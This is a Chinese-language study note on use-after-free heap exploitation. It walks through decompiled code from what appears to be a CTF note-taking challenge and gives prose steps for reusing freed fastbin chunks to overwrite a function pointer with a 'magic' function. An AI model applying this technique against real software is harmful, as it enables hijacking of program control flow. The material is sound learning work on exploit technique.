UAF原理和利用

UAF的思路看起来也比unlink简单，希望复现的时候，不会像off_by_one一样。。。

UAF顾名思义，use-after-free，指针指向的chunk被free以后没有设置为NULL导致再次申请，两个指针指向同一个chunk，就可以做一些奇怪的操作。

有以下几种情况

  • 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
  • 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。
  • 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。

经常利用的是后两种。

此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。

来看一个例子

unsigned int add_note()
{
  _DWORD *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )                  // 这个i的话没想明白，调试了一下，知道了啥意思，不用管这个。
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);               // 申请0x8的chunk，32位的话，就是0x16
                                                // chunk的指针存入全局数组
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)notelist[i] = print_note_content;// 输入内容给chunk1
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];                       // chunk1指针传递给v0
        v0[1] = malloc(size);                   // 在本来是bk的位置，申请一个新的chunk2
                                                // 也就是我们记录笔记的地方
        if ( !*((_DWORD *)notelist[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)notelist[i] + 1), size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;       // count控制只能输入5个note
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}

print函数

unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    (*(void (__cdecl **)(void *))notelist[v1])(notelist[v1]);// 这个开始的字段是我们的print_note_content字段
  return __readgsdword(0x14u) ^ v3;
}

free

unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");                            // 要删除的index
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  // 如果存在就把他free掉，先free-content，然后就是note
  if ( notelist[v1] )
  {
    free(*((void **)notelist[v1] + 1));
    free(notelist[v1]);
    puts("Success");                            // free掉之后这个指针还是存在的，没有设置位NULL
  }
  return __readgsdword(0x14u) ^ v3;
}

分析

可以看到当我创建两个chunk然后free掉第二个的时候，content的内容被清空了，但是note还是存在的，我们在查看一下全局数组。

也不是NULL；当我们再一次去申请一个堆的时候。看一下变化。

指向了同一个地址，并且没有再free状态。实际上这里应该也可以double_free，但是我还不是特别知道怎么利用。所以还是先看这个UAF吧，

前面是展示一下UAF的原理，具体利用还得看下面。主要思想还是，我们已经有了magic函数，只需要运行就可以了，一般来说就是修改got表，问题是怎么获得一个有权限的指针。

自然的，我们想要修改print函数，里面利用的note的print_note_content字段。把他修改为magic函数，就可以在print的时候调用这个函数了。

而我们唯一的输入就是，利用content的输入，可是content在高地址，而且没有溢出漏洞，怎么利用呢？。

这里UAF提供一种方法。

  • 申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）
  • 申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）
  • 释放 note0
  • 释放 note1
  • 此时，大小为 16 的 fast bin chunk 中链表为 note1->note0
  • 申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则
  • note2 其实会分配 note1 对应的内存块。
  • real content 对应的 chunk 其实是 note0。
  • 如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。

这里利用的具体就是，bins的分区管理和fastbin机制无能的我只能说妙
